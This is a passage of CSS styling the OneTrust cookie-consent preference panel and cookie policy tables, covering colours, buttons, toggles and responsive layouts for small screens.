            border-left: 0;
            border-right: 3px solid
        }

        #onetrust-pc-sdk[dir=rtl] .ot-search-cntr>svg {
            right: 0
        }

        @media only screen and (max-width: 600px) {
            #onetrust-pc-sdk.otPcCenter {
                left: 0;
                min-width: 100%;
                height: 100%;
                top: 0;
                border-radius: 0
            }
            #onetrust-pc-sdk #ot-pc-content,
            #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-container {
                margin: 1px 3px 0 10px;
                padding-right: 10px;
                width: calc(100% - 23px)
            }
            #onetrust-pc-sdk .ot-btn-container button {
                max-width: none;
                letter-spacing: .01em
            }
            #onetrust-pc-sdk #close-pc-btn-handler {
                top: 10px;
                right: 17px
            }
            #onetrust-pc-sdk p {
                font-size: .7em
            }
            #onetrust-pc-sdk #ot-pc-hdr {
                margin: 10px 10px 0 5px;
                width: calc(100% - 15px)
            }
            #onetrust-pc-sdk .vendor-search-handler {
                font-size: 1em
            }
            #onetrust-pc-sdk #ot-back-arw {
                margin-left: 12px
            }
            #onetrust-pc-sdk #ot-lst-cnt {
                margin: 0;
                padding: 0 5px 0 10px;
                min-width: 95%
            }
            #onetrust-pc-sdk .switch+p {
                max-width: 80%
            }
            #onetrust-pc-sdk .ot-ftr-stacked button {
                width: 100%
            }
            #onetrust-pc-sdk #ot-fltr-cnt {
                max-width: 320px;
                width: 90%;
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
                margin: 0;
                margin-left: 15px;
                left: auto;
                right: 40px;
                top: 85px
            }
            #onetrust-pc-sdk .ot-fltr-opt {
                margin-left: 25px;
                margin-bottom: 10px
            }
            #onetrust-pc-sdk .ot-pc-refuse-all-handler {
                margin-bottom: 0
            }
            #onetrust-pc-sdk #ot-fltr-cnt {
                right: 40px
            }
        }

        @media only screen and (max-width: 476px) {
            #onetrust-pc-sdk .ot-fltr-cntr,
            #onetrust-pc-sdk #ot-fltr-cnt {
                right: 10px
            }
            #onetrust-pc-sdk #ot-anchor {
                right: 25px
            }
            #onetrust-pc-sdk button {
                width: 100%
            }
            #onetrust-pc-sdk:not(.ot-addtl-vendors) #ot-pc-lst:not(.ot-enbl-chr) .ot-sel-all {
                padding-right: 9px
            }
            #onetrust-pc-sdk:not(.ot-addtl-vendors) #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr {
                right: 0
            }
        }

        @media only screen and (max-width: 896px)and (max-height: 425px)and (orientation: landscape) {
            #onetrust-pc-sdk.otPcCenter {
                left: 0;
                top: 0;
                min-width: 100%;
                height: 100%;
                border-radius: 0
            }
            #onetrust-pc-sdk #ot-anchor {
                left: initial;
                right: 50px
            }
            #onetrust-pc-sdk #ot-lst-title {
                margin-top: 12px
            }
            #onetrust-pc-sdk #ot-lst-title * {
                font-size: inherit
            }
            #onetrust-pc-sdk #ot-pc-hdr input {
                margin-right: 0;
                padding-right: 45px
            }
            #onetrust-pc-sdk .switch+p {
                max-width: 85%
            }
            #onetrust-pc-sdk #ot-sel-blk {
                position: static
            }
            #onetrust-pc-sdk #ot-pc-lst {
                overflow: auto
            }
            #onetrust-pc-sdk .ot-pc-footer-logo {
                display: none
            }
            #onetrust-pc-sdk #ot-lst-cnt {
                max-height: none;
                overflow: initial
            }
            #onetrust-pc-sdk #ot-lst-cnt.no-results {
                height: auto
            }
            #onetrust-pc-sdk input {
                font-size: 1em !important
            }
            #onetrust-pc-sdk p {
                font-size: .6em
            }
            #onetrust-pc-sdk #ot-fltr-modal {
                width: 100%;
                top: 0
            }
            #onetrust-pc-sdk ul li p,
            #onetrust-pc-sdk .category-vendors-list-handler,
            #onetrust-pc-sdk .category-vendors-list-handler+a,
            #onetrust-pc-sdk .category-host-list-handler {
                font-size: .6em
            }
            #onetrust-pc-sdk.ot-shw-fltr #ot-anchor {
                display: none !important
            }
            #onetrust-pc-sdk.ot-shw-fltr #ot-pc-lst {
                height: 100% !important;
                overflow: hidden;
                top: 0px
            }
            #onetrust-pc-sdk.ot-shw-fltr #ot-fltr-cnt {
                margin: 0;
                height: 100%;
                max-height: none;
                padding: 10px;
                top: 0;
                width: calc(100% - 20px);
                position: absolute;
                right: 0;
                left: 0;
                max-width: none
            }
            #onetrust-pc-sdk.ot-shw-fltr .ot-fltr-scrlcnt {
                max-height: calc(100% - 65px)
            }
        }

        #onetrust-consent-sdk #onetrust-pc-sdk,
        #onetrust-consent-sdk #ot-search-cntr,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-switch.ot-toggle,
        #onetrust-consent-sdk #onetrust-pc-sdk ot-grp-hdr1 .checkbox,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title:after,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-sel-blk,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-fltr-cnt,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-anchor {
            background-color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk h3,
        #onetrust-consent-sdk #onetrust-pc-sdk h4,
        #onetrust-consent-sdk #onetrust-pc-sdk h5,
        #onetrust-consent-sdk #onetrust-pc-sdk h6,
        #onetrust-consent-sdk #onetrust-pc-sdk p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-ven-lst .ot-ven-opts p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-desc,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-li-title,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-sel-all-hdr span,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-fltr-modal #modal-header,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-checkbox label span,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-sel-blk p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-lst-title span,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .back-btn-handler p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .ot-ven-name,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-ven-lst .consent-category,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-label-status,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-chkbox label span,
        #onetrust-consent-sdk #onetrust-pc-sdk #clear-filters-handler {
            color: #696969;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .privacy-notice-link,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler + a,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-host-list-handler,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-ven-link,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-name a,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-acc-hdr .ot-host-expand,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info a {
            color: #0a77a9;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler:hover {
            opacity: .7;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-grpcntr.ot-acc-txt,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-txt .ot-subgrp-tgl .ot-switch.ot-toggle {
            background-color: #F8F8F8;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-txt .ot-ven-dets {
            background-color: #F8F8F8;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk button:not(#clear-filters-handler):not(.ot-close-icon):not(#filter-btn-handler):not(.ot-remove-objection-handler):not(.ot-obj-leg-btn-handler):not([aria-expanded]):not(.ot-link-btn),
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-active-leg-btn {
            background-color: #0a77a9;
            border-color: #0a77a9;
            color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-active-menu {
            border-color: #0a77a9;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-remove-objection-handler {
            background-color: transparent;
            border: 1px solid transparent;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn {
            background-color: #FFFFFF;
            color: #78808E;
            border-color: #78808E;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk button:not(#clear-filters-handler):not(.ot-close-icon):not(#filter-btn-handler):not(.ot-remove-objection-handler):not(.ot-obj-leg-btn-handler):not([aria-expanded]):not(.ot-link-btn),
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-active-leg-btn,
        #ot-sdk-btn.ot-sdk-show-settings,
        #ot-sdk-btn.optanon-show-settings,
        #ot-sdk-btn-floating.ot-floating-button button {
            padding: 7px 20px;
            background-color: #09c !important;
            border-width: 2px;
            border-color: #09c !important;
            border-radius: 5px !important;
            color: #fff !important;
            font-size: 16px !important;
            font-weight: bold !important;
            line-height: 1.2 !important;
            letter-spacing: normal !important
        }

        #onetrust-consent-sdk #onetrust-pc-sdk button:hover:not(#clear-filters-handler):not(.ot-close-icon):not(#filter-btn-handler):not(.ot-remove-objection-handler):not(.ot-obj-leg-btn-handler):not([aria-expanded]):not(.ot-link-btn),
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-active-leg-btn:hover,
        #ot-sdk-btn.ot-sdk-show-settings:hover,
        #ot-sdk-btn.optanon-show-settings:hover,
        #ot-sdk-btn-floating.ot-floating-button button:hover,
        #onetrust-consent-sdk #onetrust-pc-sdk button:focus:not(#clear-filters-handler):not(.ot-close-icon):not(#filter-btn-handler):not(.ot-remove-objection-handler):not(.ot-obj-leg-btn-handler):not([aria-expanded]):not(.ot-link-btn),
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-active-leg-btn:focus,
        #ot-sdk-btn.ot-sdk-show-settings:focus,
        #ot-sdk-btn.optanon-show-settings:focus,
        #ot-sdk-btn-floating.ot-floating-button button:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk button:active:not(#clear-filters-handler):not(.ot-close-icon):not(#filter-btn-handler):not(.ot-remove-objection-handler):not(.ot-obj-leg-btn-handler):not([aria-expanded]):not(.ot-link-btn),
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-active-leg-btn:active,
        #ot-sdk-btn.ot-sdk-show-settings:active,
        #ot-sdk-btn.optanon-show-settings:active,
        #ot-sdk-btn-floating.ot-floating-button button:active {
            background-color: #0a77a9 !important;
            border-color: #0a77a9 !important;
            color: #fff !important
        }

        #onetrust-consent-sdk #onetrust-pc-sdk button:focus:not(#clear-filters-handler):not(.ot-close-icon):not(#filter-btn-handler):not(.ot-remove-objection-handler):not(.ot-obj-leg-btn-handler):not([aria-expanded]):not(.ot-link-btn),
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-active-leg-btn:focus,
        #ot-sdk-btn.ot-sdk-show-settings:focus,
        #ot-sdk-btn.optanon-show-settings:focus,
        #ot-sdk-btn-floating.ot-floating-button button:focus {
            background-color: #09c !important;
            border-color: #09c !important;
            color: #fff !important;
            box-shadow: 0 0 0 3px rgba(0, 153, 204, 0.5) !important;
            outline: none !important
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .privacy-notice-link,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler+a,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-host-list-handler,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-ven-link,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-name a,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-acc-hdr .ot-host-expand,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info a {
            margin: 0;
            padding: 0 1px;
            border-radius: 2px;
            color: #0a77a9;
            text-decoration: none
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .privacy-notice-link:hover,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler:hover,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler+a:hover,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-host-list-handler:hover,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-ven-link:hover,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-name a:hover,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-acc-hdr .ot-host-expand:hover,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info a:hover {
            color: #036;
            text-decoration: underline
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .privacy-notice-link:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler+a:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-host-list-handler:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-ven-link:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-name a:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-acc-hdr .ot-host-expand:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info a:focus {
            box-shadow: 0 0 0 3px rgba(0, 153, 204, 0.5);
            outline: none
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .privacy-notice-link:visited,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler:visited,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler+a:visited,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-host-list-handler:visited,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-ven-link:visited,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-name a:visited,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-acc-hdr .ot-host-expand:visited,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info a:visited {
            color: #036;
            text-decoration: none
        }

        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title {
            font-size: 1.5rem
        }

        #onetrust-consent-sdk #onetrust-pc-sdk #ot-category-title {
            font-size: 1.2rem
        }

        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-desc {
            font-size: 0.9rem;
            line-height: 1.3
        }

        #onetrust-consent-sdk #onetrust-pc-sdk h3,
        #onetrust-consent-sdk #onetrust-pc-sdk h4,
        #onetrust-consent-sdk #onetrust-pc-sdk h5,
        #onetrust-consent-sdk #onetrust-pc-sdk h6,
        #onetrust-consent-sdk #onetrust-pc-sdk p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-ven-lst .ot-ven-opts p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-desc,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-li-title,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-sel-all-hdr span,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-fltr-modal #modal-header,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-checkbox label span,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-sel-blk p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-lst-title span,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .back-btn-handler p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .ot-ven-name,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-ven-lst .consent-category,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-label-status,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-chkbox label span,
        #onetrust-consent-sdk #onetrust-pc-sdk #clear-filters-handler {
            color: inherit
        }

        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-content {
            margin-left: 25px;
            padding-left: 5px
        }

        @media only screen and (max-width: 600px) {
            #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-content {
                margin-left: 5px
            }
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-sdk-button:hover,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-sdk-button:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk:not(.ot-leg-btn-container)>button:hover,
        #onetrust-consent-sdk #onetrust-pc-sdk:not(.ot-leg-btn-container)>button:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk input[type="submit"]:hover,
        #onetrust-consent-sdk #onetrust-pc-sdk input[type="submit"]:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk input[type="reset"]:hover,
        #onetrust-consent-sdk #onetrust-pc-sdk input[type="reset"]:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk input[type="button"]:hover,
        #onetrust-consent-sdk #onetrust-pc-sdk input[type="button"]:focus {
            opacity: 1 !important
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-tgl input:focus+.ot-switch {
            border-radius: 20px !important;
            box-shadow: 0 0 0 3px rgba(0, 153, 204, 0.5) !important;
            outline: none !important
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-switch-nob {
            background-color: #d0d4d9;
            border-color: #d0d4d9
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob {
            background-color: #0a77a9
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-switch-nob:before {
            height: 19px;
            width: 19px;
            background-color: #fff;
            border: 1px solid #d0d4d9
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob:before {
            background-color: #fff;
            border-color: #d0d4d9;
            -webkit-transform: translateX(21px);
            -ms-transform: translateX(21px);
            transform: translateX(21px)
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-cat-grp .ot-always-active {
            color: #008216 !important;
            font-size: 1rem
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-cat-header {
            font-weight: bold;
            font-size: 1rem
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc {
            font-size: 0.9rem
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-cat-item>button:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-cntr>button:focus,
        #onetrust-consent-sdk #onetrust-pc-sdk li>button:focus {
            box-shadow: 0 0 0 3px rgba(0, 153, 204, 0.5);
            outline: none
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-cat-grp {
            margin-bottom: 3px
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-pc-footer-logo {
            display: none
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-pc-header {
            border-bottom-color: #d8d8d8
        }

        #ot-sdk-btn-floating.ot-floating-button button {
            padding: 1px 6px !important;
            line-height: 15px !important
        }

        #onetrust-pc-sdk #ot-pc-desc ul {
            padding: 0 0 0 18px;
        }

        #onetrust-pc-sdk #ot-pc-desc ul li {
            list-style-type: disc;
            margin: 0;
            padding: 0;
            border: 0;
        }

        .ot-sdk-cookie-policy {
            font-family: inherit;
            font-size: 16px
        }

        .ot-sdk-cookie-policy.otRelFont {
            font-size: 1rem
        }

        .ot-sdk-cookie-policy h3,
        .ot-sdk-cookie-policy h4,
        .ot-sdk-cookie-policy h6,
        .ot-sdk-cookie-policy p,
        .ot-sdk-cookie-policy li,
        .ot-sdk-cookie-policy a,
        .ot-sdk-cookie-policy th,
        .ot-sdk-cookie-policy #cookie-policy-description,
        .ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
        .ot-sdk-cookie-policy #cookie-policy-title {
            color: dimgray
        }

        .ot-sdk-cookie-policy #cookie-policy-description {
            margin-bottom: 1em
        }

        .ot-sdk-cookie-policy h4 {
            font-size: 1.2em
        }

        .ot-sdk-cookie-policy h6 {
            font-size: 1em;
            margin-top: 2em
        }

        .ot-sdk-cookie-policy th {
            min-width: 75px
        }

        .ot-sdk-cookie-policy a,
        .ot-sdk-cookie-policy a:hover {
            background: #fff
        }

        .ot-sdk-cookie-policy thead {
            background-color: #f6f6f4;
            font-weight: bold
        }

        .ot-sdk-cookie-policy .ot-mobile-border {
            display: none
        }

        .ot-sdk-cookie-policy section {
            margin-bottom: 2em
        }

        .ot-sdk-cookie-policy table {
            border-collapse: inherit
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy {
            font-family: inherit;
            font-size: 1rem
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
            color: dimgray
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
            margin-bottom: 1em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup {
            margin-left: 1.5em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group-desc,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-table-header,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td {
            font-size: .9em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td a {
            font-size: inherit
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
            font-size: 1em;
            margin-bottom: .6em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-title {
            margin-bottom: 1.2em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy>section {
            margin-bottom: 1em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
            min-width: 75px
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a:hover {
            background: #fff
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead {
            background-color: #f6f6f4;
            font-weight: bold
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-mobile-border {
            display: none
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy section {
            margin-bottom: 2em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li {
            list-style: disc;
            margin-left: 1.5em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li h4 {
            display: inline-block
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
            border-collapse: inherit;
            margin: auto;
            border: 1px solid #d7d7d7;
            border-radius: 5px;
            border-spacing: initial;
            width: 100%;
            overflow: hidden
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
            border-bottom: 1px solid #d7d7d7;
            border-right: 1px solid #d7d7d7
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
            border-bottom: 0px
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr th:last-child,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr td:last-child {
            border-right: 0px
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
            width: 25%
        }

        .ot-sdk-cookie-policy[dir=rtl] {
            text-align: left
        }

        #ot-sdk-cookie-policy h3 {
            font-size: 1.5em
        }

        @media only screen and (max-width: 530px) {
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) table,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tbody,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) th,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
                display: block
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead tr {
                position: absolute;
                top: -9999px;
                left: -9999px
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
                margin: 0 0 1em 0
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd),
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd) a {
                background: #f6f6f4
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td {
                border: none;
                border-bottom: 1px solid #eee;
                position: relative;
                padding-left: 50%
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
                position: absolute;
                height: 100%;
                left: 6px;
                width: 40%;
                padding-right: 10px
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) .ot-mobile-border {
                display: inline-block;
                background-color: #e4e4e4;
                position: absolute;
                height: 100%;
                top: 0;
                left: 45%;
                width: 2px
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
                content: attr(data-label);
                font-weight: bold
            }
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) li {
                word-break: break-word;
                word-wrap: break-word
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
                overflow: hidden
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
                border: none;
                border-bottom: 1px solid #d7d7d7
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tbody,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
                display: block
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
                width: auto
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
                margin: 0 0 1em 0
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
                height: 100%;
                width: 40%;
                padding-right: 10px
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
                content: attr(data-label);
                font-weight: bold
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li {
                word-break: break-word;
                word-wrap: break-word
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead tr {
                position: absolute;
                top: -9999px;
                left: -9999px;
                z-index: -9999
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
                border-bottom: 1px solid #d7d7d7;
                border-right: 0px
            }
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td:last-child {
                border-bottom: 0px
            }
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
            color: #696969;
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
            color: #696969;
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
            color: #696969;
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
            color: #696969;
        }

